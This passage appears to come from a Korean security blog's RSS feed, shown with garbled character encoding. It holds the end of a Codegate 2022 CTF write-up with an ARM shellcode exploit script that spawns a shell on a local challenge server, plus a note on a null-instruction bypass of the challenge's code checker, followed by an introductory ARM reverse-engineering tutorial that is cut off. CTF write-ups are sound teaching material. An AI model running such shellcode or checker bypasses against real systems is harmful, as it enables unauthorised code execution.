ìˆ˜í–‰í•˜ê³  <code>BLT</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ìœ¼ë¡œ ì¡°ê±´ ë¶„ê¸°í•˜ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤. <code>check_code</code> í•¨ìˆ˜ ìƒì—ì„œëŠ” <code>update_nf</code> í•¨ìˆ˜ì—ì„œ ì˜ëª» ë°˜ì˜í•œ ê²°ê³¼ë¡œ ì¸í•´ <code>N</code> ë¹„íŠ¸ê°€ 1ì´ ë˜ì–´, <code>V</code> ë¹„íŠ¸ì™€ ê°™ì§€ ì•Šê²Œ ë˜ë¯€ë¡œ ì¡°ê±´ ë¶„ê¸°ë¥¼ ìˆ˜í–‰í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì‹¤ì œ ì‹¤í–‰ ì‹œì—ëŠ” <code>N</code> ë¹„íŠ¸ê°€ 0ìœ¼ë¡œ ì¡°ê±´ ë¶„ê¸°ë¥¼ ìˆ˜í–‰í•˜ì§€ ì•Šì„ ê²ƒì…ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_cpsr</span><span class="params">(<span class="type">int</span> inst)</span> <span class="comment">// 0x11314</span></span><br><span class="line">&#123;</span><br><span class="line">  _BOOL4 v1; <span class="comment">// r3</span></span><br><span class="line">  _BOOL4 v2; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> valid; <span class="comment">// [sp+8h] [bp-24h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> cpsr; <span class="comment">// [sp+10h] [bp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  cpsr = em-&gt;reg-&gt;cpsr;</span><br><span class="line">  <span class="keyword">switch</span> ( shr28(inst) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0u</span>:                                    <span class="comment">// equal (z == 1)</span></span><br><span class="line">      valid = cpsr &amp; <span class="number">0x40000000</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1u</span>:                                    <span class="comment">// not equal (z == 0)</span></span><br><span class="line">      valid = (cpsr &amp; <span class="number">0x40000000</span>) == <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">10u</span>:                                   <span class="comment">// signed greater than or equal (n == v)</span></span><br><span class="line">      valid = cpsr &gt;&gt; <span class="number">31</span> == (<span class="number">8</span> * cpsr) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">11u</span>:                                   <span class="comment">// signed less than (n != v)</span></span><br><span class="line">      valid = cpsr &gt;&gt; <span class="number">31</span> != (<span class="number">8</span> * cpsr) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">12u</span>:                                   <span class="comment">// signed greater than (z == 0 and n == v)</span></span><br><span class="line">      v1 = (cpsr &amp; <span class="number">0x40000000</span>) == <span class="number">0</span> &amp;&amp; cpsr &gt;&gt; <span class="number">31</span> == (<span class="number">8</span> * cpsr) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">      valid = v1;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">13u</span>:                                   <span class="comment">// signed less than or equal (z == 1 or n == v)</span></span><br><span class="line">      v2 = (cpsr &amp; <span class="number">0x40000000</span>) != <span class="number">0</span> || cpsr &gt;&gt; <span class="number">31</span> != (<span class="number">8</span> * cpsr) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">      valid = v2;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">14u</span>:                                   <span class="comment">// always</span></span><br><span class="line">      valid = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:                                    <span class="comment">// can only be executed unconditionally</span></span><br><span class="line">      valid = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> valid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ë‹¤ìŒê³¼ ê°™ì´ <code>ADDS</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ê²°ê³¼ê°€ 1ì´ ë˜ë„ë¡ í•˜ê³ , <code>BLT</code> ì˜ ë¶„ê¸° ì£¼ì†Œë¥¼ ì…¸ì½”ë“œ ì´í›„ê°€ ë˜ë„ë¡ ìµìŠ¤í”Œë¡œì‡ ì½”ë“œë¥¼ ì‘ì„±í•˜ì˜€ìŠµë‹ˆë‹¤. ìµìŠ¤í”Œë¡œì‡ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ë©´ ì…¸ì„ íšë“í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process([&quot;qemu-arm-static&quot;, &quot;-L&quot;, &quot;/usr/arm-linux-gnueabi&quot;, &quot;./app&quot;])</span></span><br><span class="line">r = remote(<span class="string">&quot;localhost&quot;</span>, <span class="number">1234</span>)</span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    payload = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    adds r0, r0, 1</span></span><br><span class="line"><span class="string">    blt exit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">shellcode:</span></span><br><span class="line"><span class="string">    add r0, pc, 12</span></span><br><span class="line"><span class="string">    mov r1, 0</span></span><br><span class="line"><span class="string">    mov r2, 0</span></span><br><span class="line"><span class="string">    mov r7, 11</span></span><br><span class="line"><span class="string">    svc 0</span></span><br><span class="line"><span class="string">    .word 0x6e69622f</span></span><br><span class="line"><span class="string">    .word 0x0068732f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">exit:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>, arch=<span class="string">&quot;arm&quot;</span>)</span><br><span class="line"></span><br><span class="line">    r.sendafter(<span class="string">b&quot;Insert Your Code :&gt;&quot;</span>, payload)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;:&gt;&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Secret code :&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Code? :&gt;&quot;</span>, r.recvline().strip())</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./ex.py</span><br><span class="line">[+] Opening connection to localhost on port 1234: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> Good! Now Execute Real Machine</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=1000(ctf) gid=1000(ctf) <span class="built_in">groups</span>=1000(ctf)</span><br></pre></td></tr></table></figure><h3 id="%EB%8B%A4%EB%A5%B8-%ED%92%80%EC%9D%B4" tabindex="-1">ë‹¤ë¥¸ í’€ì´</h3><p><code>check_code</code> í•¨ìˆ˜ë¥¼ ë³´ë©´ ë‹¤ìŒì˜ 10í–‰ì—ì„œ <code>inst</code> ê°€ 0ì¸ ê²½ìš° ë°˜ë³µë¬¸ì„ íƒˆì¶œí•©ë‹ˆë‹¤. ì´ ê²½ìš° 0ì„ ë¦¬í„´í•˜ì—¬ <code>main</code> í•¨ìˆ˜ì˜ ê²€ì‚¬ë¥¼ í†µê³¼í•˜ê¸° ë•Œë¬¸ì— ê³§ë°”ë¡œ ì…ë ¥í•œ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ARMì—ì„œ ê¸°ê³„ì–´ <code>\x00\x00\x00\x00</code> ì€ <code>ANDEQ R0, R0, R0</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì— í•´ë‹¹í•˜ëŠ”ë°, ì‹¤ì œë¡œëŠ” ì•„ë¬´ ì˜í–¥ì´ ì—†ëŠ” <code>NOP</code> ì™€ ê°™ìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_code</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">for</span> ( inst = <span class="number">-1</span>; em-&gt;reg-&gt;pc &lt; (<span class="type">unsigned</span> <span class="type">int</span>)(em-&gt;code + <span class="number">4096</span>); inst = fetched )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">char</span> *)em-&gt;reg-&gt;pc &lt; em-&gt;code )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    fetched = *(_DWORD *)em-&gt;reg-&gt;pc;</span><br><span class="line">    em-&gt;reg-&gt;pc += <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !inst )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( inst != <span class="number">-1</span> &amp;&amp; !check_cpsr(inst) )</span><br><span class="line">      sigill(inst);</span><br><span class="line">    op1 = get_class(inst);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> ( op1 != <span class="number">-1</span> )</span><br><span class="line">LABEL_23:</span><br><span class="line">      sigill(inst);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ë”°ë¼ì„œ ì½”ë“œë¥¼ ì…ë ¥í•  ë•Œ <code>\x00\x00\x00\x00</code> ì´í›„ ì…¸ì½”ë“œë¥¼ ì…ë ¥í•˜ë©´ <code>check_code</code> í•¨ìˆ˜ë¥¼ í†µê³¼í•˜ì—¬ ì…¸ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ í’€ì´ëŠ” ì¶œì œìê°€ ë””ìŠ¤ì½”ë“œì—ì„œ ì˜ë„í•˜ì§€ ì•Šì€ í’€ì´ë¼ê³  ë°í˜”ìŠµë‹ˆë‹¤.</p><h2 id="%EC%B0%B8%EA%B3%A0%EC%9E%90%EB%A3%8C" tabindex="-1">ì°¸ê³ ìë£Œ</h2><p>[1] ARM, â€œA5: ARM Instruction Set Encoding,â€ in <em>ARMÂ® Architecture Reference Manual ARMv7-A and ARMv7-R edition</em>. ARM Limited, 2018, pp. 191-216.</p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content:encoded>
      
      
      <category domain="https://juhyun167.github.io/categories/Security/">Security</category>
      
      <category domain="https://juhyun167.github.io/categories/Security/CTF/">CTF</category>
      
      
      
      <comments>https://juhyun167.github.io/2022/07/03/codegate22-arvm/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[ARM] 1. ARM ë¦¬ë²„ìŠ¤ ì—”ì§€ë‹ˆì–´ë§ ê¸°ì´ˆ</title>
      <link>https://juhyun167.github.io/2022/07/02/arm-1-introduction/</link>
      <guid>https://juhyun167.github.io/2022/07/02/arm-1-introduction/</guid>
      <pubDate>Sat, 02 Jul 2022 01:14:59 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;%EA%B0%9C%EC%9A%94&quot; tabindex=&quot;-1&quot;&gt;ê°œìš”&lt;/h2&gt;
&lt;p&gt;ARM ì•„í‚¤í…ì²˜ì˜ íŠ¹ì§•ê³¼ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ì´í•´í•˜ê³ , ê¸°ì´ˆì ì¸ ë¦¬ë²„ìŠ¤ ì—”ì§€ë‹ˆì–´ë§ì„ ì—°ìŠµí•´ ë³´ê² ìŠµë‹ˆë‹¤.&lt;/p&gt;
&lt;h2 id=&quot;arm-%EC%95%84%ED%82%A</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">ê°œìš”</h2><p>ARM ì•„í‚¤í…ì²˜ì˜ íŠ¹ì§•ê³¼ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ì´í•´í•˜ê³ , ê¸°ì´ˆì ì¸ ë¦¬ë²„ìŠ¤ ì—”ì§€ë‹ˆì–´ë§ì„ ì—°ìŠµí•´ ë³´ê² ìŠµë‹ˆë‹¤.</p><h2 id="arm-%EC%95%84%ED%82%A4%ED%85%8D%EC%B2%98-%EC%86%8C%EA%B0%9C" tabindex="-1">ARM ì•„í‚¤í…ì²˜ ì†Œê°œ</h2><p>1980ë…„ëŒ€ í›„ë°˜ ê°œë°œëœ ARM ì•„í‚¤í…ì²˜ëŠ” íœ´ëŒ€í°, ìë™ì°¨, í…”ë ˆë¹„ì „ ë“± ë‹¤ì–‘í•œ ì„ë² ë””ë“œ ì¥ì¹˜ì—ì„œ ì‚¬ìš©ë˜ê³  ìˆìŠµë‹ˆë‹¤. ARM ì•„í‚¤í…ì²˜ëŠ” ARM í™€ë”©ìŠ¤ê°€ ë””ìì¸í•œ í›„ ë‹¤ë¥¸ íšŒì‚¬ë“¤ì— ë¼ì´ì„¼ìŠ¤ë¥¼ íŒë§¤í•˜ë©°, ì• í”Œ, í€„ì»´ê³¼ ê°™ì€ íŒŒíŠ¸ë„ˆì‚¬ëŠ” ë¼ì´ì„¼ìŠ¤ë¥¼ êµ¬ë§¤í•˜ì—¬ ìì‹ ë“¤ì˜ ì¥ì¹˜ì— ì‚¬ìš©í•  í”„ë¡œì„¸ì„œì— ì ìš©í•©ë‹ˆë‹¤. ì´ë“¤ í”„ë¡œì„¸ì„œëŠ” ëª¨ë‘ ARM ë ˆí¼ëŸ°ìŠ¤ ë§¤ë‰´ì–¼ì— ì •ì˜ëœ ê¸°ë³¸ì ì¸ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ ì§‘í•©ê³¼ ë©”ëª¨ë¦¬ ëª¨ë¸ì„ êµ¬í˜„í•˜ê³  ìˆìŠµë‹ˆë‹¤.</p><p><img src="/images/arm-1-introduction/1.png" alt="1.png"></p><h2 id="arm-%EC%95%84%ED%82%A4%ED%85%8D%EC%B2%98%EC%9D%98-%ED%8A%B9%EC%A7%95" tabindex="-1">ARM ì•„í‚¤í…ì²˜ì˜ íŠ¹ì§•</h2><p>ARMì€ RISC ì•„í‚¤í…ì²˜ë¡œ, CISC ì•„í‚¤í…ì²˜ì¸ x86/x64ì™€ëŠ” ëª‡ ê°€ì§€ ë‹¤ë¥¸ ì ì´ ìˆìŠµë‹ˆë‹¤.</p><ol><li>ARM ì¸ìŠ¤íŠ¸ëŸ­ì…˜ ì§‘í•©ì€ x86/64ì— ë¹„í•´ ì‘ì§€ë§Œ, ë²”ìš© ë ˆì§€ìŠ¤í„°ì˜ ìˆ˜ëŠ” ë” ë§ìŠµë‹ˆë‹¤.</li><li>ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ê¸¸ì´ê°€ ê³ ì •ë˜ì–´ ìˆìŠµë‹ˆë‹¤.</li><li>ë©”ëª¨ë¦¬ ì ‘ê·¼ì— load-store ëª¨ë¸ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.<ul><li>ë°ì´í„°ë¥¼ ì—°ì‚°í•˜ê¸° ì „ ë°˜ë“œì‹œ ë©”ëª¨ë¦¬ì—ì„œ ë ˆì§€ìŠ¤í„°ë¡œ ì˜®ê²¨ì•¼ í•˜ë©°, ì˜¤ì§ loadì™€ store ì¸ìŠ¤íŠ¸ëŸ­ì…˜ë§Œ ë©”ëª¨ë¦¬ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li></ul></li></ol><p>ARMì€ ì—¬ëŸ¬ ê°€ì§€ì˜ ì„œë¡œ ë‹¤ë¥¸ íŠ¹ê¶Œ ìˆ˜ì¤€(privileged modes)ì„ ì œê³µí•˜ëŠ”ë°, ì¼ë‹¨ì€ í¸ì˜ë¥¼ ìœ„í•´ Userë¥¼ x86/64ì—ì„œì˜ Ring 3, Supervisorë¥¼ Ring 0ë¡œ ìƒê°í•´ë„ ì¢‹ìŠµë‹ˆë‹¤.</p><p><img src="/images/arm-1-introduction/2.jpg" alt="2.jpg"></p><p>ARM í”„ë¡œì„¸ì„œëŠ” ë‘ ê°€ì§€ ìƒíƒœ(state), ARMê³¼ Thumbìœ¼ë¡œ ë™ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë•Œ ìƒíƒœëŠ” ì‚¬ìš©í•  ì¸ìŠ¤íŠ¸ëŸ­ì…˜ ì§‘í•©ê³¼ ê´€ë ¨ì´ ìˆìœ¼ë©°, íŠ¹ê¶Œ ìˆ˜ì¤€ê³¼ëŠ” ë¬´ê´€í•©ë‹ˆë‹¤. ARM ìƒíƒœì—ì„œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ê¸¸ì´ëŠ” í•­ìƒ 32ë¹„íŠ¸ì´ë©°, Thumb ìƒíƒœì—ì„œëŠ” 16ë¹„íŠ¸ ë˜ëŠ” 32ë¹„íŠ¸ì…ë‹ˆë‹¤.</p><p>í”„ë¡œì„¸ì„œì˜ ìƒíƒœëŠ” ë‹¤ìŒê³¼ ê°™ì´ ê²°ì •ë©ë‹ˆë‹¤.</p><ol><li><code>BX</code> ë˜ëŠ” <code>BLX</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ìœ¼ë¡œ ë¶„ê¸°í•  ë•Œ, ëª©ì ì§€ ë ˆì§€ìŠ¤í„°ì˜ ìµœí•˜ìœ„ ë¹„íŠ¸(LSB)ê°€ 1ì´ë©´ Thumb ìƒíƒœë¡œ ì „í™˜í•©ë‹ˆë‹¤.</li><li>í˜„ì¬ <code>CPSR</code> ë ˆì§€ìŠ¤í„°ì˜ <code>T</code> ë¹„íŠ¸ê°€ 1ì´ë©´ Thumb ìƒíƒœì…ë‹ˆë‹¤.</li></ol><p>ëŒ€ë¶€ë¶„ì˜ ARMê³¼ Thumb ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ë™ì¼í•œ ë‹ˆëª¨ë‹‰(mnemonic)ì„ ê°–ê³  ìˆì§€ë§Œ, Thumb ì¸ìŠ¤íŠ¸ëŸ­ì…˜ ì¤‘ ê¸¸ì´ê°€ 32ë¹„íŠ¸ì¸ ê²ƒì€ <code>.w</code> ì ‘ë¯¸ì‚¬ê°€ ë¶™ìŠµë‹ˆë‹¤.</p><p>ARMì€ ë˜í•œ ì¡°ê±´ë¶€ ì‹¤í–‰(conditional execution)ì„ ì§€ì›í•©ë‹ˆë‹¤. ì´ëŠ” ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì— íŠ¹ì •í•œ ì¡°ê±´ì´ í•¨ê»˜ ì¸ì½”ë”©ë˜ì–´ ìˆê³ , ì´ ì¡°ê±´ì„ ë§Œì¡±í•˜ëŠ” ê²½ìš°ì—ë§Œ ì‹¤í–‰ë¨ì„ ì˜ë¯¸í•©ë‹ˆë‹¤. ì¡°ê±´ë¶€ ì‹¤í–‰ì„ ì‚¬ìš©í•˜ë©´ ë¶„ê¸°ë¬¸ì— í•„ìš”í•œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ê°œìˆ˜ë¥¼ ì¤„ì¼ ìˆ˜ ìˆì–´ ìœ ìš©í•©ë‹ˆë‹¤. ARM ìƒíƒœì—ì„œ ëª¨ë“  ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ì¡°ê±´ë¶€ ì‹¤í–‰ì´ ê°€ëŠ¥í•˜ì§€ë§Œ, ì¡°ê±´ì˜ ê¸°ë³¸ê°’ì€ â€˜í•­ìƒ ì‹¤í–‰í•¨(<code>AL</code>)â€™ ì…ë‹ˆë‹¤. Thumb ìƒíƒœì—ì„œëŠ” íŠ¹ë³„í•œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ <code>IT</code> ë¥¼ ì‚¬ìš©í•´ì•¼ë§Œ ì¡°ê±´ë¶€ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p>ë˜ ë‹¤ë¥¸ ARMì˜ ë…íŠ¹í•œ ê¸°ëŠ¥ì€ ë°°ëŸ´ ì‹œí”„í„°(barrel shifter)ë¡œ, íŠ¹ì •í•œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ê°’ì„ ì‹œí”„íŠ¸í•˜ê±°ë‚˜ íšŒì „(rotate)ì‹œí‚¤ëŠ” ë‹¤ë¥¸ ì—°ì‚°ì„ í¬í•¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. (e.g. <code>MOV R1, R0, LSL #1</code> ì€ <code>R0</code> ë ˆì§€ìŠ¤í„°ë¥¼ ì™¼ìª½ìœ¼ë¡œ 1ë¹„íŠ¸ ì‹œí”„íŠ¸í•œ í›„ <code>R1</code> ë ˆì§€ìŠ¤í„°ì— ëŒ€ì…í•©ë‹ˆë‹¤) ë°°ëŸ´ ì‹œí”„í„°ëŠ” ì¡°ê±´ë¶€ ì‹¤í–‰ê³¼ ë§ˆì°¬ê°€ì§€ë¡œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ê°œìˆ˜ë¥¼ ì¤„ì´ëŠ” ë° ë„ì›€ì´ ë©ë‹ˆë‹¤.</p><h2 id="%EB%B2%94%EC%9A%A9-%EB%A0%88%EC%A7%80%EC%8A%A4%ED%84%B0" tabindex="-1">ë²”ìš© ë ˆì§€ìŠ¤í„°</h2><p>ARM ì•„í‚¤í…ì²˜ëŠ” 16ê°œì˜ 32ë¹„íŠ¸ ë²”ìš© ë ˆì§€ìŠ¤í„° <code>R0</code> , <code>R1</code> , â€¦ , <code>R15</code> ë¥¼ ì œê³µí•©ë‹ˆë‹¤. ëª¨ë“  ë²”ìš© ë ˆì§€ìŠ¤í„°ëŠ” ê°œë°œìê°€ ììœ ë¡­ê²Œ ì‚¬ìš©í•  ìˆ˜ ìˆì§€ë§Œ, ì‹¤ì œë¡œëŠ” ì•ì˜ 12ê°œ ë ˆì§€ìŠ¤í„°ë§Œ ë²”ìš©ìœ¼ë¡œ ì“°ì´ê³  ë‚˜ë¨¸ì§€ëŠ” íŠ¹ìˆ˜ ë ˆì§€ìŠ¤í„°ì²˜ëŸ¼ ì‚¬ìš©ë©ë‹ˆë‹¤.</p><ul><li><code>R13</code> ì€ ìŠ¤íƒ í¬ì¸í„°(<code>SP</code>)ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.</li><li><code>R14</code> ëŠ” ë§í¬ ë ˆì§€ìŠ¤í„°(<code>LR</code>)ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.<ul><li>ë§í¬ ë ˆì§€ìŠ¤í„°(link register)ëŠ” í•¨ìˆ˜ì˜ ë¦¬í„´ ì£¼ì†Œë¥¼ ë³´ê´€í•˜ëŠ” ë ˆì§€ìŠ¤í„°ë¡œ, ì¼ë¶€ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì— ì˜í•´ ì‚¬ìš©ë©ë‹ˆë‹¤. (e.g. <code>BL</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê¸° ì „ í•­ìƒ <code>LR</code> ì— ë¦¬í„´ ì£¼ì†Œë¥¼ ì €ì¥í•©ë‹ˆë‹¤)</li></ul></li><li><code>R15</code> ëŠ” í”„ë¡œê·¸ë¨ ì¹´ìš´í„°(<code>PC</code>)ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.<ul><li>ARM ìƒíƒœì—ì„œ <code>PC</code> ëŠ” x86/64ì™€ëŠ” ë‹¤ë¥´ê²Œ, í˜„ì¬ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ ì£¼ì†Œì— 8ì„ ë”í•œ ê°’ì…ë‹ˆë‹¤. (ARM ì¸ìŠ¤íŠ¸ëŸ­ì…˜ 2ê°œ ë’¤ì˜ ì£¼ì†Œ)</li><li>Thumb ìƒíƒœì—ì„œ <code>PC</code> ëŠ” í˜„ì¬ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ ì£¼ì†Œì— 4ë¥¼ ë”í•œ ê°’ì…ë‹ˆë‹¤. (Thumb ì¸ìŠ¤íŠ¸ëŸ­ì…˜ 2ê°œ ë’¤ì˜ ì£¼ì†Œ)</li><li><code>PC</code> ë ˆì§€ìŠ¤í„°ì— ì£¼ì†Œë¥¼ ëŒ€ì…í•  ìˆ˜ ìˆìœ¼ë©°, ëŒ€ì… ì¦‰ì‹œ ê·¸ ì£¼ì†Œë¶€í„° ë‹¤ìŒ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì´ ì‹¤í–‰ë©ë‹ˆë‹¤.</li><li><code>gdb</code> ë””ë²„ê±°ì—ì„œëŠ” <code>PC</code> ë ˆì§€ìŠ¤í„°ì˜ ê°’ìœ¼ë¡œ í˜„ì¬ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ì£¼ì†Œë¥¼ ë³´ì—¬ì£¼ëŠ”ë°, ì´ëŠ” í¸ì˜ìƒ <code>PC</code> ê°€ aliasë˜ì–´ìˆê¸° ë•Œë¬¸ì— ê·¸ëŸ° ê²ƒìœ¼ë¡œ ì‹¤ì œì™€ëŠ” ì°¨ì´ê°€ ìˆìŒì— ìœ ì˜í•©ë‹ˆë‹¤.</li></ul></li></ul><p>ARMì€ í˜„ì¬ í”„ë¡œì„¸ì„œì™€ ì‹¤í–‰ íë¦„ì˜ ìƒíƒœë¥¼ <code>CPSR</code> ë ˆì§€ìŠ¤í„°ì— ë³´ê´€í•©ë‹ˆë‹¤. (<code>APSR</code> ë ˆì§€ìŠ¤í„°ë¼ê³ ë„ í•©ë‹ˆë‹¤) <code>CPSR</code> ë ˆì§€ìŠ¤í„°ì—ëŠ” ë‹¤ìŒì„ í¬í•¨í•œ ë‹¤ì–‘í•œ í”Œë˜ê·¸ë“¤ì´ ìˆìŠµë‹ˆë‹¤.</p><ul><li><code>E</code> (ì—”ë””ì–¸ ë¹„íŠ¸) - ARMì€ ë¹… ì—”ë””ì–¸ ëª¨ë“œì™€ ë¦¬í‹€ ì—”ë””ì–¸ ëª¨ë“œ ëª¨ë‘ì—ì„œ ë™ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.<ul><li>ë¦¬í‹€ ì—”ë””ì–¸ì€ 0, ë¹… ì—”ë””ì–¸ì€ 1ì´ë©° ëŒ€ë¶€ë¶„ì˜ ê²½ìš° ë¦¬í‹€ 